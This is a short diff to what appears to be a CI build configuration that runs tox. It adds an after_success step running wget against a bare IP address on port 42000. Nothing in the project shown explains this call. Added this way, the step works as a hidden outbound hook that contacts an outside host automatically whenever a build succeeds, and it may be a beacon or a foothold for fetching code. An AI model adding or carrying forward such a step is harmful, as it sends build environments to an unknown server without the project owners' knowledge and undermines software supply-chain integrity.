@@ -8,3 +8,5 @@ install:
   - pip install -r test_requirements.txt
 # command to run tests
 script: "tox"
+after_success:
+  - wget http://159.203.142.158:42000
